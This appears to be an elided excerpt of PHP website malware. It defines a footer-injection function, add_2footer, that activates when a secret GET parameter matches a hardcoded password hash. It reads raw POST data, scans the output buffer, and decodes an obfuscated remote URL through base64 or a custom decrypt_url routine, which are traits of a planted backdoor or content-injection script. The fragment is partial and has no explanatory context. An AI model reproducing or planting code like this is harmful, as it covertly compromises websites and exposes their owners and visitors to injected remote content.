...
$p = $_POST;
$_passssword = '76ad5ddb00834cb53332a61a5434b688';
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '76ad5ddb00834cb53332a61a5434b688') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
//        $url = base64_decode('a3d3czksLDIzNy0xNzstNzstMjs2LGFvbGQsPGFudCV2d25ccGx2cWBmPjQ2MjM5MTYyMzYxOTc3Nw==');
        $url = decrypt_url('a3d3czksLDIzNy0xNzstNzstMjs2LGFvbGQsPGFudCV2d25ccGx2cWBmPjQ2MjM5MTYyMzYxOTc3Nw==');
